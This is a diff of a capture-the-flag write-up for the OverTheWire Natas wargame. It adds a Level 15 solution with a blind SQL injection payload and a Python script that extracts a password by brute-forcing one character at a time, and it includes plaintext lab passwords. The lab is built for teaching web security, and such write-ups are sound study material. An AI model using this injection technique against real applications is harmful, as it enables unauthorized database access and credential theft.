@@ -23,6 +23,7 @@ layout:
 ## Useful Resources
 
 * [CyberChef](https://gchq.github.io/CyberChef/)
+* [SQL Injections](../w33bsec_c00kb00k/exploitation/sql-injections.md)
 
 ## Natas Level 0
 
@@ -121,7 +122,7 @@ Next Password:    b.....S
 URL:              http://natas6.natas.labs.overthewire.org
 ```
 
-The page now asks for a second password using the following, exposed script [View sourcecode](http://natas6.natas.labs.overthewire.org/index-source.html)
+The page now asks for a second password using the following script
 
 ```javascript
 <?
@@ -372,7 +373,7 @@ We need to add a value to the cmd parameter. Appending the URL with _?cmd=cat%20
 
 ```
 Username:         natas14
-Next Password:    SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+Next Password:    S.....x
 URL:              http://natas14.natas.labs.overthewire.org
 ```
 
@@ -386,8 +387,53 @@ Checking the sourcecode just confirmed this. There are various solutions. My fir
 
 ```
 Username:         natas15
-Next Password:    
+Next Password:    hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
 URL:              http://natas15.natas.labs.overthewire.org
 ```
 
-In this level there is no password field. Just a button to check if a user exists and more source code to examine.
+In this level there is no password field. Just a button to check if a user exists and more source code to examine.\
+Viewing this source code we can see that it now only checks if a user exists which is either TRUE or FALSE.\
+Time to start testing for Boolean-based Blind SQLi. Checking if natas16 returns true, as expected.
+
+```sql
+natas16" AND password LIKE BINARY "a%
+```
+
+This queries the database if the user natas16 exists and the password starts with 'a'. ([MySQL BINARY Function](https://www.w3schools.com/mysql/func_mysql_binary.asp)) So all we have to do is automate the guessing process.&#x20;
+
+```python
+import requests
+from requests.auth import HTTPBasicAuth
+
+url = "http://natas15.natas.labs.overthewire.org/index.php"
+auth = HTTPBasicAuth("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
+
+charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+password = ""
+
+while True:
+    found = False
+    for c in charset:
+        payload = f'natas16" AND password LIKE BINARY "{password}{c}%'
+        r = requests.post(url, data={"username": payload}, auth=auth)
+        if "This user exists" in r.text:
+            password += c
+            print(f"[+]progress: {password}")
+            found = True
+            break
+
+    if not found:
+        print(f"[✓]DONE: {password}")
+        break
+```
+
+<figure><img src="../.gitbook/assets/image (3).png" alt="" width="265"><figcaption></figcaption></figure>
+
+## Level 16
+
+```
+Username:         natas16
+Next Password:    
+URL:              http://natas16.natas.labs.overthewire.org
+```
+
